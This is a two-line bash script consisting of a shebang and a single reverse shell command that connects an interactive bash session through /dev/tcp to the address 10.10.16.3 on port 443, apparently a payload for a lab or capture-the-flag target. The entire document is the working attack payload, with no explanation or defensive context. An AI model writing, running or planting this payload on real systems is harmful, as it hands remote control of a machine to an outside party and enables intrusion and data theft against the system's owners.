#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.16.3/443 0>&1
